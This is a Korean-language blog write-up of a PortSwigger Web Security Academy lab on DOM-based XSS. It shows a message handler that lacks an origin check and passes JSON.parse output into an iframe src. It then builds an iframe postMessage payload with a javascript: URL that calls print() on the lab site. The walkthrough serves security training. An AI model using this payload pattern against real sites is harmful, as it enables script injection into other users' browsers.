---
layout: post
title: "Burp Academy-Dom 관련 취약점: DOM XSS using web messages and JSON.parse"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, Dom 관련 취약점, XSS]
toc: true
last_modified_at: 2024-11-05 09:33:00 +0900
---

# 개요
- Dom based 타입의 XSS 취약점 문제이다. 
- 문제 주소: https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse
- Dom 취약점 중에서 웹메세지 설명페이지: https://portswigger.net/web-security/dom-based/controlling-the-web-message-source
- 난이도: PRACTITIONER (보통)


# 문제 
- 이 랩에는 웹 메시지를 JSON 형식으로 파싱하고 있다. 
- 랩을 풀려면 exploit 서버에서 HTML페이지를 만들어서 print함수가 호출되도록 하라. 

```
This lab uses web messaging and parses the message as JSON. To solve the lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the print() function.
```

# 풀이 

1. 랩을 살펴본다. Top페이지를 보면 다음과 같은 웹 메세지에 대한 이벤트 핸들러를 등록하는 코드가 있다. 조금 살펴보면 취약한 코드를 발견할 수 있다. 

- 오리진 체크를 하고 있지 않다. 따라서 임의의 사이트(공격자의 사이트)에서 웹 메세지를 보낼 수 있다. 
- 웹 메세지의 데이터를 그대로 JSON.parse의 파라메터로 넘겨주고 있다. 
- JSON 오브젝트에 있는 `type` 속성에 따라 switch 문에서 분기된다. `type`의 값이 "load-channel"이면,  ACMEplayer.element.src 에 JSON 오브젝트의 `url`값이 삽입된다. 

```html
<script>
    window.addEventListener('message', function(e) {
        var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
        document.body.appendChild(iframe);
        try {
            d = JSON.parse(e.data);
        } catch(e) {
            return;
        }
        switch(d.type) {
            case "page-load":
                ACMEplayer.element.scrollIntoView();
                break;
            case "load-channel":
                ACMEplayer.element.src = d.url;
                break;
            case "player-height-changed":
                ACMEplayer.element.style.width = d.width + "px";
                ACMEplayer.element.style.height = d.height + "px";
                break;
        }
    }, false);
</script>
```

2. 위의 코드와 분석결과를 참고하여 victim에서 전송할 JSON 오브젝트를 만든다. 다음과 같이 `type`과 `url`속성을 가진 JSON 오브젝트를 만든다. 

```json
{
    "type": "load-channel",
    "url": "javascript:print()"
}
```

3. 위의 오브젝트가 iframe 태그의 onload이벤트가 발동되면 전송되도록 페이로드를 완성한다. 다음과 같다. 

```html
<iframe src=https://0a5100e3045f3b0882775c120022002e.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

4. exploit서버에서 페이로드를 저장하고 "Deliver to Victim"버튼을 눌러서 전송하면 잠시 뒤 랩이 풀렸다는 메세지가 표시된다. 

![](/images/burp-academy-dom-based-3-success.png)